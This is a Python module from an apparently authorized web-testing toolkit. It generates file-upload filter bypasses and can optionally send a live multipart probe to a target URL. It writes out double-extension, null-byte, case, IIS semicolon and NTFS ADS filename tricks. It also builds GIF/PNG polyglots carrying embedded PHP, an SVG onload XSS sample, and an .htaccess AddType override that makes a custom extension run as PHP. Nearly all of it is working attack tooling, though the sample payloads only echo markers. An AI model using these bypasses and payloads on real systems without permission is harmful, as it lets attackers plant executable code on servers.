"""
File upload bypass generator — PayloadsAllTheThings / Burp upload class.

Produces filename, Content-Type, and polyglot variants used to bypass
extension blacklists, MIME checks, and naive content inspection.

Does NOT upload to targets by default — generates candidates for authorized testing.
Optional live probe mode sends multipart POST when explicitly enabled.
"""

from __future__ import annotations

import hashlib
import json
import re
from typing import Any

# Magic-byte prefixes (hex) for common types
_MAGIC = {
    "gif": bytes.fromhex("474946383961"),  # GIF89a
    "png": bytes.fromhex("89504e470d0a1a0a"),
    "jpg": bytes.fromhex("ffd8ffe000104a464946"),
    "pdf": bytes.fromhex("255044462d"),
    "zip": bytes.fromhex("504b0304"),
}

# Dangerous server-side extensions
_EXEC = [
    "php", "php3", "php4", "php5", "php7", "phtml", "pht", "phps",
    "asp", "aspx", "ashx", "asmx", "cer", "asa",
    "jsp", "jspx", "jsw", "jsv",
    "cgi", "pl", "py", "rb", "shtml",
    "cfm", "cfml",
]

# Often-allowed extensions used as camouflage
_SAFE = ["jpg", "jpeg", "png", "gif", "pdf", "txt", "doc", "docx", "svg", "xml", "html", "htm"]


def _polyglot_gif_php(shell: str = "<?php echo 'psec'; ?>") -> bytes:
    """GIF89a header + PHP payload — classic polyglot."""
    return _MAGIC["gif"] + b"\n" + shell.encode() + b"\n"


def _polyglot_png_php(shell: str = "<?php echo 'psec'; ?>") -> bytes:
    return _MAGIC["png"] + b"\n" + shell.encode() + b"\n"


def generate(
    basename: str = "psec",
    shell_hint: str = "php",
    include_polyglot: bool = True,
) -> dict[str, Any]:
    """
    Generate filename / Content-Type / content candidates for upload testing.
    """
    names: list[dict[str, Any]] = []
    content_types: list[str] = [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/pdf",
        "application/octet-stream",
        "text/plain",
        "application/x-php",
        "application/javascript",
        "image/svg+xml",
        "text/html",
        "application/x-httpd-php",
        "",  # empty CT
    ]

    # double extensions
    for safe in ("jpg", "png", "gif", "pdf"):
        for exe in ("php", "phtml", "asp", "aspx", "jsp", "cgi"):
            names.append({
                "filename": f"{basename}.{safe}.{exe}",
                "technique": "double-ext",
                "severity": "high",
            })
            names.append({
                "filename": f"{basename}.{exe}.{safe}",
                "technique": "reverse-double-ext",
                "severity": "medium",
            })

    # null byte (legacy)
    for safe in ("jpg", "png"):
        for exe in ("php", "asp"):
            names.append({
                "filename": f"{basename}.{exe}%00.{safe}",
                "technique": "null-byte",
                "severity": "high",
                "note": "Works on legacy runtimes only",
            })
            names.append({
                "filename": f"{basename}.{exe}\x00.{safe}",
                "technique": "null-byte-raw",
                "severity": "high",
            })

    # case tricks
    for exe in ("pHp", "pHP5", "PhP", "aSpX", "Jsp"):
        names.append({
            "filename": f"{basename}.{exe}",
            "technique": "case-bypass",
            "severity": "medium",
        })

    # special chars / path
    for exe in ("php", "asp"):
        for name in (
            f"{basename}.{exe}/",
            f"{basename}.{exe}.",
            f"{basename}.{exe} ",
            f"{basename}.{exe}.",
            f".{basename}.{exe}",
            f"{basename}.{exe};.jpg",
            f"{basename}.{exe}:.jpg",
            f"{basename}.{exe}%20",
            f"{basename}.{exe}%0a",
            f"{basename}.{exe}%0d%0a",
        ):
            names.append({"filename": name, "technique": "special-char", "severity": "medium"})

    # SVG / XSS / SSRF-ish
    names.append({"filename": f"{basename}.svg", "technique": "svg-xss", "severity": "medium"})
    names.append({"filename": f"{basename}.html", "technique": "html-upload", "severity": "medium"})
    names.append({"filename": f"{basename}.shtml", "technique": "ssi", "severity": "high"})
    names.append({"filename": f"{basename}.htaccess", "technique": "htaccess", "severity": "critical"})
    names.append({"filename": ".htaccess", "technique": "htaccess", "severity": "critical"})

    # Windows ADS / alternate
    names.append({"filename": f"{basename}.php::$DATA", "technique": "ads", "severity": "high"})
    names.append({"filename": f"{basename}.asp;.jpg", "technique": "iis-semicolon", "severity": "high"})

    polyglots = []
    if include_polyglot:
        for kind, builder in (("gif-php", _polyglot_gif_php), ("png-php", _polyglot_png_php)):
            raw = builder()
            polyglots.append({
                "id": kind,
                "filename": f"{basename}.{kind.split('-')[0]}",
                "content_hex_prefix": raw[:16].hex(),
                "size": len(raw),
                "sha256": hashlib.sha256(raw).hexdigest()[:16],
                "note": "Image magic + embedded script — serve content-type image/*",
                "severity": "high",
            })

    # content samples for htaccess / svg
    samples = {
        "htaccess": "AddType application/x-httpd-php .psec\n",
        "svg_xss": (
            '<?xml version="1.0" standalone="no"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
            '<text>psec</text></svg>'
        ),
        "php_shell_hint": "<?php echo 'psec_upload_ok'; ?>",
    }

    return {
        "ok": True,
        "basename": basename,
        "filenames": names,
        "filename_count": len(names),
        "content_types": content_types,
        "polyglots": polyglots,
        "samples": samples,
        "exec_extensions": _EXEC,
        "safe_extensions": _SAFE,
        "engine": "upload",
        "version": "2.0",
        "equivalent": "PayloadsAllTheThings Upload / Burp upload bypass",
        "note": "Generator only by default — use authorized targets for live multipart tests",
    }


_BOUNDARY = "----PsecBoundary7MA4YWxkTrZu0gW"
_SENSITIVE_HEADER_NAMES = frozenset({
    "authorization", "cookie", "set-cookie", "x-api-key", "api-key", "apikey",
    "x-auth-token", "x-access-token", "proxy-authorization",
})
_SENSITIVE_KEY = r"(?:authorization|cookie|set-cookie|x-api-key|api[_-]?key|access[_-]?token|refresh[_-]?token|id[_-]?token|token|secret|password|passwd|signature|sig)"
_URL_RE = re.compile(r"https?://[^\s\"'<>]+", re.IGNORECASE)
_BEARER_RE = re.compile(r"(?i)\bbearer\s+[A-Za-z0-9._~+/=-]+")
_KEY_VALUE_RE = re.compile(rf"(?i)(\b{_SENSITIVE_KEY}\b)(\s*(?:=|:)\s*)(\"[^\"]*\"|'[^']*'|[^\s\r\n,;}}&]+)")
_ENCODED_KEY_VALUE_RE = re.compile(rf"(?i)(\b{_SENSITIVE_KEY}\b)(%3a|%3d)(?:%[0-9a-f]{{2}}|[A-Za-z0-9._~\-])+")


def _route(value: str | bool | None) -> bool | None:
    if value in (None, "", "auto", "AUTO"):
        return None
    if value in (True, "proxy", "PROXY", "true", "True"):
        return True
    if value in (False, "direct", "DIRECT", "false", "False"):
        return False
    raise ValueError("route must be auto, proxy, or direct")


def _is_sensitive_header(name: str) -> bool:
    lowered = str(name or "").strip().lower()
    return lowered in _SENSITIVE_HEADER_NAMES or any(token in lowered for token in ("token", "secret", "password"))


def _safe(value: Any) -> str:
    """Redact labelled, bearer, encoded, and URL-query credentials in display evidence."""
    text = str(value or "")
    try:
        from .._http import redact_url
        text = _URL_RE.sub(lambda match: redact_url(match.group(0)), text)
    except Exception:
        pass
    text = _BEARER_RE.sub("Bearer [redacted]", text)
    text = _KEY_VALUE_RE.sub(lambda match: f"{match.group(1)}{match.group(2)}[redacted]", text)
    text = _ENCODED_KEY_VALUE_RE.sub(lambda match: f"{match.group(1)}{match.group(2)}[redacted]", text)
    return text


def _safe_headers(headers: dict[str, Any] | None) -> dict[str, str]:
    return {str(key): "[redacted]" if _is_sensitive_header(str(key)) else _safe(value) for key, value in (headers or {}).items()}


def _parse_headers(raw: str, user_agent: str) -> tuple[dict[str, str], list[str]]:
    """Accept a JSON object or Name: Value lines; reserve multipart control headers."""
    headers: dict[str, str] = {"User-Agent": str(user_agent or "pyodide-security/upload-engine/2.1")}
    ignored: list[str] = []
    text = str(raw or "").strip()
    if not text:
        return headers, ignored
    if text.startswith("{"):
        try:
            parsed = json.loads(text)
        except Exception as exc:  # noqa: BLE001
            raise ValueError(f"headers JSON is invalid: {_safe(exc)}") from None
        if not isinstance(parsed, dict):
            raise ValueError("headers JSON must be an object")
        pairs = parsed.items()
    else:
        pairs = []
        for line in text.splitlines():
            if not line.strip():
                continue
            if ":" not in line:
                raise ValueError("header lines must use Name: Value format")
            key, _, value = line.partition(":")
            pairs.append((key, value))
    for key, value in pairs:
        name, item = str(key).strip(), str(value).strip()
        if not name:
            continue
        if any(control in name or control in item for control in ("\r", "\n", "\x00")):
            raise ValueError("headers may not contain control characters")
        if len(name) > 256 or len(item) > 8192:
            raise ValueError("header name or value exceeds the local probe bound")
        if name.lower() in {"content-type", "content-length", "transfer-encoding"}:
            ignored.append(name)
            continue
        headers[name] = item
    return headers, ignored


def _parse_statuses(raw: str) -> list[tuple[int, int]]:
    """Parse exact codes, inclusive ranges, and 2xx-style expected selectors."""
    out: list[tuple[int, int]] = []
    for item in str(raw or "").replace("\n", ",").split(","):
        token = item.strip().lower()
        if not token:
            continue
        if len(token) == 3 and token[0].isdigit() and token[1:] == "xx":
            low = int(token[0]) * 100
            out.append((low, low + 99))
        elif "-" in token:
            left, _, right = token.partition("-")
            if not left.strip().isdigit() or not right.strip().isdigit():
                raise ValueError("expected_statuses uses 200, 200-204, or 2xx selectors")
            low, high = int(left), int(right)
            if low > high or low < 100 or high > 599:
                raise ValueError("expected status ranges must be between 100 and 599")
            out.append((low, high))
        elif token.isdigit() and 100 <= int(token) <= 599:
            status = int(token)
            out.append((status, status))
        else:
            raise ValueError("expected_statuses uses 200, 200-204, or 2xx selectors")
    return out or [(200, 204)]


def _status_matches(status: int, expected: list[tuple[int, int]]) -> bool:
    return any(low <= int(status or 0) <= high for low, high in expected)


def _parse_keywords(raw: str) -> list[str]:
    out: list[str] = []
    for item in str(raw or "").replace("\n", ",").split(","):
        token = item.strip().lower()
        if token and token not in out:
            out.append(token[:120])
    return out[:30]


def _validate_part_value(value: Any, name: str, limit: int = 1024) -> str:
    text = str(value if value is not None else "")
    if not text.strip():
        raise ValueError(f"{name} cannot be empty")
    if len(text) > limit:
        raise ValueError(f"{name} exceeds the local probe bound")
    if any(control in text for control in ("\r", "\n", "\x00")):
        raise ValueError(f"{name} may not contain control characters")
    return text


def _escape_disposition(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')


def _build_multipart(field_name: str, filename: str, content_type: str, body_text: str, content_mode: str, marker_text: str) -> tuple[str, dict[str, Any]]:
    field = _validate_part_value(field_name, "field_name", 256)
    name = _validate_part_value(filename, "filename", 512)
    mime = _validate_part_value(content_type, "content_type", 256)
    mode = str(content_mode or "custom").strip().lower()
    if mode not in {"custom", "benign_marker"}:
        raise ValueError("content_mode must be custom or benign_marker")
    if mode == "benign_marker":
        marker = _validate_part_value(marker_text, "marker_text", 1024)
        content = f"GOAR_UPLOAD_PROBE:{marker}"
    else:
        content = str(body_text if body_text is not None else "")
        if len(content.encode("utf-8", errors="replace")) > 524288:
            raise ValueError("body_text exceeds the 512 KiB browser probe bound")
    body = (
        f"--{_BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{_escape_disposition(field)}"; filename="{_escape_disposition(name)}"\r\n'
        f"Content-Type: {mime}\r\n\r\n{content}\r\n--{_BOUNDARY}--\r\n"
    )
    body_bytes = body.encode("utf-8", errors="replace")
    return body, {"mode": mode, "boundary": "fixed-psec-boundary", "body_length": len(body_bytes), "body_sha256": hashlib.sha256(body_bytes).hexdigest()[:16]}


async def probe(
    url: str,
    field_name: str = "file",
    filename: str = "psec.php.jpg",
    content_type: str = "image/jpeg",
    body_text: str = "GIF89a\n<?php echo 'psec'; ?>\n",
    user_agent: str = "pyodide-security/upload-engine/2.0",
    headers: str = "",
    timeout_ms: int = 8000,
    retries: int = 0,
    retry_statuses: str = "408,429,500,502,503,504",
    route: str = "auto",
    content_mode: str = "custom",
    marker_text: str = "goar-upload-probe",
    expected_statuses: str = "200,201,202,204",
    success_keywords: str = "upload,success,stored,saved,psec,file",
    include_response_body: bool = True,
    preview_chars: int = 400,
    include_request_evidence: bool = True,
) -> dict[str, Any]:
    """Authorized single-part multipart proof through the shared Goar transport."""
    from .._http import http_request, redact_url
    from .. import policy

    raw_url = str(url or "").strip()
    err = policy.check_url_for_active(raw_url)
    if err:
        return {"ok": False, "error": _safe(err), "engine": "upload", "policy": policy.status()}
    if not raw_url.startswith(("http://", "https://")):
        raw_url = "https://" + raw_url
    try:
        request_headers, ignored_headers = _parse_headers(headers, user_agent)
        timeout = max(1000, min(int(timeout_ms or 8000), 120000))
        retry_count = max(0, min(int(retries or 0), 5))
        retryable = {int(item.strip()) for item in str(retry_statuses or "").split(",") if item.strip().isdigit()}
        use_proxy = _route(route)
        expected = _parse_statuses(expected_statuses)
        keywords = _parse_keywords(success_keywords)
        body, multipart = _build_multipart(field_name, filename, content_type, body_text, content_mode, marker_text)
    except (TypeError, ValueError) as exc:
        return {"ok": False, "url": redact_url(raw_url), "error": _safe(exc), "engine": "upload", "policy": policy.status()}

    request_headers["Content-Type"] = f"multipart/form-data; boundary={_BOUNDARY}"
    attempts: list[dict[str, Any]] = []
    response: dict[str, Any] = {}
    for attempt_index in range(retry_count + 1):
        response = await http_request(raw_url, method="POST", headers=request_headers, body=body, timeout_ms=timeout, use_proxy=use_proxy)
        attempts.append({"attempt": attempt_index + 1, "status": int(response.get("status") or 0), "ok": bool(response.get("ok")), "transport": response.get("transport"), "via_proxy": bool(response.get("via_proxy")), "via_goar": bool(response.get("via_goar")), "elapsed_ms": response.get("elapsed_ms"), "error": _safe(response.get("error"))})
        if response.get("ok") or int(response.get("status") or 0) not in retryable:
            break

    status = int(response.get("status") or 0)
    response_body = str(response.get("body") or "")
    safe_body = _safe(response_body)
    preview_limit = max(0, min(int(preview_chars or 400), 200000))
    keyword_hits = [keyword for keyword in keywords if keyword in response_body.lower()]
    expected_match = _status_matches(status, expected)
    interesting = bool(expected_match or keyword_hits)
    safe_url = redact_url(response.get("final_url") or response.get("url") or raw_url)
    route_name = "auto" if use_proxy is None else ("proxy" if use_proxy else "direct")
    request_evidence = {
        "method": "POST", "url": redact_url(raw_url), "headers": _safe_headers(request_headers),
        "field_name": _safe(field_name), "filename": _safe(filename), "content_type": _safe(content_type),
        "multipart": multipart, "timeout_ms": timeout, "retries": retry_count, "retry_statuses": sorted(retryable),
        "route": route_name, "ignored_headers": ignored_headers,
    }
    body_preview = safe_body[:preview_limit] if include_response_body else ""
    return {
        "ok": bool(status), "url": safe_url, "filename": _safe(filename), "content_type": _safe(content_type), "status": status,
        "expected": {"statuses": str(expected_statuses or "200-204"), "matched": expected_match},
        "interesting": interesting, "keyword_hits": keyword_hits, "body_preview": body_preview,
        "response": {"status": status, "headers": _safe_headers(response.get("headers") or {}), "body_length": len(response_body), "body_preview": body_preview if include_response_body else None, "final_url": safe_url},
        "error": _safe(response.get("error")), "attempts": attempts, "attempt_count": len(attempts),
        "request": request_evidence if include_request_evidence else None,
        "transport": {"name": response.get("transport"), "via_proxy": bool(response.get("via_proxy")), "via_goar": bool(response.get("via_goar")), "route": route_name},
        "engine": "upload", "version": "2.1-browser-adapted", "equivalent": "PayloadsAllTheThings upload bypass / Burp multipart testing",
        "limitations": [
            "Single text multipart part only; native file-picker, filesystem, streaming, multi-file, and race workflows are not implemented in browser/Pyodide.",
            "A successful HTTP status or response keyword is acceptance evidence, not proof of storage, retrieval, or execution.",
        ],
        "policy": policy.status(),
    }
